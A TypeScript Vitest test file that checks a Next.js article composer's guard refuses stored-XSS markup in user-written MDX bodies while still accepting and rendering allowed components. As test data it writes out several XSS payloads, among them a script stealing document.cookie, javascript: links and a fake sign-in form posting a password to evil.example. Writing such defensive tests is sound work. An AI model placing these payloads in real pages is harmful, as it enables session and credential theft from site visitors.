import { compileMDX } from "next-mdx-remote/rsc";
import { renderToStaticMarkup, renderToString } from "react-dom/server";
import { describe, expect, it } from "vitest";
import {
  articleMdxOptions,
  composerArticleMdxOptions,
  mdxComponents,
} from "@/components/content/mdx-components";
import { ARTICLE_BODY_COMPONENTS, articleBodyProblems } from "@/lib/content/article-body-guard";
import { articleSeoChecklist, blockingItems } from "@/lib/content/article-seo-checklist";
import { compileArticleBody } from "@/lib/content/article-body";

// ---------------------------------------------------------------------------
// Stored XSS in a composer article's body (review of #696). The body is MDX
// written in the browser; next-mdx-remote's blockJS strips JS EXPRESSIONS
// only, so every element below reached the public page and the admin
// preview. Each vector is rendered with the REAL options:
//   * articleMdxOptions (what composer bodies used to compile with) — the
//     vector really gets through (or, for <div style>, throws: a 500);
//   * composerArticleMdxOptions — the compile refuses it;
//   * compileArticleBody (the page, the preview and the publish gate) — ok:
//     false;
//   * the composer's checklist — a BLOCKING item.
// ---------------------------------------------------------------------------

async function render(source: string, options: typeof articleMdxOptions | typeof composerArticleMdxOptions) {
  const { content } = await compileMDX({ source, options, components: mdxComponents });
  return renderToStaticMarkup(content);
}

const words = (n: number) => Array.from({ length: n }, () => "craft").join(" ");
const PROSE = `${words(40)}\n\n## How does it work?\n\n${words(400)}`;

function checklistOf(body: string) {
  return articleSeoChecklist({
    slug: "a-guide",
    title: "A guide",
    description: "A summary.",
    body,
    tags: [],
    category: "design",
    faq: [],
  });
}

const VECTORS: Array<{ name: string; body: string; leaks: RegExp | "throws" }> = [
  { name: "<script>", body: "<script>alert(document.cookie)</script>", leaks: /<script>/ },
  {
    name: "<iframe srcdoc>",
    body: '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    leaks: /<iframe srcDoc=|<iframe srcdoc=/i,
  },
  {
    name: "<meta http-equiv=refresh>",
    body: '<meta httpEquiv="refresh" content="0;url=https://evil.example" />',
    leaks: /<meta http-equiv="refresh"/,
  },
  {
    name: "<form>",
    body: '<form action="https://evil.example/steal" method="post"><input name="password" /><button>Sign in</button></form>',
    leaks: /<form action="https:\/\/evil\.example\/steal"/,
  },
  { name: "<object>", body: '<object data="https://evil.example/x.swf"></object>', leaks: /<object data=/ },
  {
    name: "raw <img src=external>",
    body: '<img src="https://evil.example/track.png" alt="x" />',
    leaks: /<img src="https:\/\/evil\.example\/track\.png"/,
  },
  { name: "<div style>", body: '<div style="position:fixed;inset:0">Gotcha</div>', leaks: "throws" },
];

describe("the composer body guard — every reported vector", () => {
  for (const vector of VECTORS) {
    describe(vector.name, () => {
      const body = `${PROSE}\n\n${vector.body}\n`;

      it("got through the old options (the vector was real)", async () => {
        if (vector.leaks === "throws") {
          await expect(render(body, articleMdxOptions)).rejects.toThrow();
        } else {
          expect(await render(body, articleMdxOptions)).toMatch(vector.leaks);
        }
      });

      it("is refused by the composer's compile, the page / preview / publish compile and the checklist", async () => {
        await expect(render(body, composerArticleMdxOptions)).rejects.toThrow(/refused/);
        const compiled = await compileArticleBody(body, "composer");
        expect(compiled.ok).toBe(false);
        const blocking = blockingItems(checklistOf(body)).map((item) => item.id);
        expect(blocking).toContain("body-markup");
      });
    });
  }
});

const SCAN_SRC = 'src="https://cards.scryfall.io/large/front/a.jpg"';
const SCAN_HREF = 'href="https://scryfall.com/card/lea/210"';

/** Every body this file says the guard ACCEPTS — each must also RENDER
 *  (the gate compiles without rendering; a body that passed it and threw on
 *  the page was a 500). */
const ACCEPTED: Array<[string, string]> = [
  [
    "Markdown, GFM and the five article components",
    [
      PROSE,
      "",
      '| A | B |\n| --- | --- |\n| <Mana cost="{2}{R}" /> | two |',
      "",
      '<Callout tone="tip" title="Note">Print a **test** sheet. See [the guide](/articles/x) or [Scryfall](https://scryfall.com).</Callout>',
      "",
      `<CardRow caption="Two prints" size="large"><CardScan name="Llanowar Elves" printing="Alpha, 1993" artist="Anson Maddocks" ${SCAN_SRC} ${SCAN_HREF} /></CardRow>`,
      "",
      '<Figure src="/article-media/naming/cover.svg" alt="A title bar" caption="The bar" width="1600" height="900" />',
      "",
      "Write a literal brace as \\{T\\}.",
    ].join("\n"),
  ],
  [
    "Markdown images, ours and an outsider's",
    `${PROSE}\n\n![A diagram](/article-media/naming/title-fit.svg "Caption")\n\n![Tracker](https://evil.example/t.png)\n`,
  ],
  // Optional attributes left out, and empty strings: drawn as nothing, never a throw.
  ["a CardScan with only src and href", `${PROSE}\n\n<CardScan ${SCAN_SRC} ${SCAN_HREF} />\n`],
  ["a Mana with an empty cost", `${PROSE}\n\nIt costs <Mana cost="" />.\n`],
  ["a Figure with no alt or size", `${PROSE}\n\n<Figure src="/article-media/naming/cover.svg" />\n`],
  ["a Callout with no tone or title", `${PROSE}\n\n<Callout>Plain.</Callout>\n`],
  ["a Callout with a tone it doesn't know", `${PROSE}\n\n<Callout tone="loud">Plain.</Callout>\n`],
  ["a bare CardRow", `${PROSE}\n\n<CardRow />\n`],
];

describe("the composer body guard — the rest of the rule", () => {
  it.each([
    ["a javascript: Markdown link", "[click](javascript:alert(1))"],
    ["a javascript: reference definition", "[click][x]\n\n[x]: javascript:alert(1)"],
    ["a CardScan with a javascript: href", `<CardScan name="A" printing="B" artist="C" ${SCAN_SRC} href="javascript:alert(1)" />`],
    ["an attribute a component doesn't read", '<Callout tone="tip" style="color:red">Hi</Callout>'],
    ["a JSX spread", "<Callout {...props}>Hi</Callout>"],
    ["an import", 'import X from "y"'],
    ["an export", "export const x = 1"],
    ["a {…} expression in prose (blockJS dropped it silently)", "It costs {2}{R}."],
    ["a fragment", "<>hi</>"],
    ["an unknown component", "<Tweet id=\"1\" />"],
    ["an element nested in an allowed one", '<Callout tone="tip"><script>alert(1)</script></Callout>'],
    // Values that compiled, passed every check, then threw at render (a 500):
    ["an href={…} blockJS empties", `<CardScan ${SCAN_SRC} href={"javascript:alert(1)"} />`],
    ["a bare href (true)", `<CardScan ${SCAN_SRC} href />`],
    ["a CardScan with no src", `<CardScan ${SCAN_HREF} />`],
    ["a CardScan with no href", `<CardScan ${SCAN_SRC} />`],
    ["a CardScan whose href is empty (not a safe link)", `<CardScan ${SCAN_SRC} href="" />`],
    ["a bare Mana cost (true)", "It costs <Mana cost />."],
    ["a Mana with no cost", "It costs <Mana />."],
    ["a Mana cost={…}", 'It costs <Mana cost={"{R}"} />.'],
    ["a Figure width={1600} (blockJS would drop the size; write width=\"1600\")", '<Figure src="/article-media/naming/cover.svg" alt="A bar" width={1600} height="900" />'],
    ["a bare Figure alt (true)", '<Figure src="/article-media/naming/cover.svg" alt />'],
    ["a Callout title={…}", '<Callout title={"x"}>Hi</Callout>'],
  ])("refuses %s", async (_name, snippet) => {
    const body = `${PROSE}\n\n${snippet}\n`;
    expect(articleBodyProblems(body).length).toBeGreaterThan(0);
    await expect(render(body, composerArticleMdxOptions)).rejects.toThrow(/refused/);
    expect((await compileArticleBody(body, "composer")).ok).toBe(false);
    expect(blockingItems(checklistOf(body)).map((item) => item.id)).toContain("body-markup");
  });

  it("names what a value needs", () => {
    const problems = articleBodyProblems(`${PROSE}\n\n<CardScan ${SCAN_SRC} href={"x"} />\n\n<Mana />\n`);
    expect(problems.join(" ")).toMatch(/<CardScan href> needs a quoted value .*not \{…\}/);
    expect(problems.join(" ")).toMatch(/<CardScan> needs href="…"/);
    expect(problems.join(" ")).toMatch(/<Mana> needs cost="…"/);
  });

  it("refuses a body MDX can't parse (an HTML comment) in the checklist as well", async () => {
    const body = `${PROSE}\n\n<!-- a note -->\n`;
    expect(articleBodyProblems(body)[0]).toMatch(/isn't valid MDX/);
    expect((await compileArticleBody(body, "composer")).ok).toBe(false);
  });

  it.each(ACCEPTED)("accepts AND renders %s", async (_name, body) => {
    expect(articleBodyProblems(body)).toEqual([]);
    expect(blockingItems(checklistOf(body)).map((item) => item.id)).not.toContain("body-markup");
    const compiled = await compileArticleBody(body, "composer");
    expect(compiled.ok).toBe(true);
    if (!compiled.ok) return;
    expect(() => renderToString(compiled.content)).not.toThrow();
  });

  it("draws the five components as written", async () => {
    const html = await render(ACCEPTED[0][1], composerArticleMdxOptions);
    expect(html).toContain("<table>");
    expect(html).toContain('<aside class="my-6');
    expect(html).toContain('src="https://cards.scryfall.io/large/front/a.jpg"');
    expect(html).toContain('src="/article-media/naming/cover.svg"');
    expect(html).toContain('width="1600"');
    expect(html).toContain("{T}");
    expect(Object.keys(ARTICLE_BODY_COMPONENTS).sort()).toEqual(["Callout", "CardRow", "CardScan", "Figure", "Mana"]);
  });

  it("draws a Markdown image only from our media (the media-only mapping), never refusing it", async () => {
    const html = await render(ACCEPTED[1][1], composerArticleMdxOptions);
    expect(html).toContain('src="/article-media/naming/title-fit.svg"');
    expect(html).not.toContain("evil.example");
  });

  it("leaves the git guides' options alone (they are reviewed in a PR)", () => {
    expect(articleMdxOptions.mdxOptions.remarkPlugins).not.toContain(
      composerArticleMdxOptions.mdxOptions.remarkPlugins[0],
    );
  });
});

describe("the article components take strings only (never a throw)", () => {
  // What a bare attribute (true) or a {…} value blockJS dropped (undefined)
  // hands them — the guard refuses both for a composer body; a git guide
  // compiled without the guard must not 500 either.
  it.each([
    ["CardScan with a bare href", `<CardScan ${SCAN_SRC} href />`],
    ["CardScan with an emptied href", `<CardScan ${SCAN_SRC} href={"x"} />`],
    ["CardScan with no src or href", "<CardScan />"],
    ["Mana with a bare cost", "<Mana cost />"],
    ["Mana with no cost", "<Mana />"],
    ["Figure with a bare src and alt", "<Figure src alt />"],
  ])("%s draws nothing", async (_name, snippet) => {
    const html = await render(`Before.\n\n${snippet}\n\nAfter.`, articleMdxOptions);
    expect(html).not.toMatch(/<img|<figure|ms-/);
    expect(html).toContain("After.");
  });
});
